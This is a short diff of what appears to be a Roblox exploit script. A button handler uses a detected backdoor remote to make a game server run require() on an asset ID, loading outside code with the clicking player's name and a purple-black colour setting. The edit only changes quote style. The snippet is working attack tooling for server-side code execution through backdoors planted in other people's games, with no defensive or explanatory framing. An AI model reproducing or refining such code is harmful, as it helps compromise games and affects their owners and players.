@@ -391,7 +391,7 @@ end)
 Sens_d.MouseButton1Click:Connect(function()
     if backdoor then
         local playerName = Players.LocalPlayer.Name
-        runRemote(backdoor, "require(85380043749737)('"..player.Name.."', ColorSequence.new(Color3.fromRGB(128, 0, 128), Color3.fromRGB(0, 0, 0)), 'Standard')")
+        runRemote(backdoor, "require(85380043749737)('"..player.Name.."', ColorSequence.new(Color3.fromRGB(128, 0, 128), Color3.fromRGB(0, 0, 0)), \"Standard\")")
         Sens_d.Text = "Loaded!"
         buttonClickEffect(Sens_d)
         task.wait(0.5)
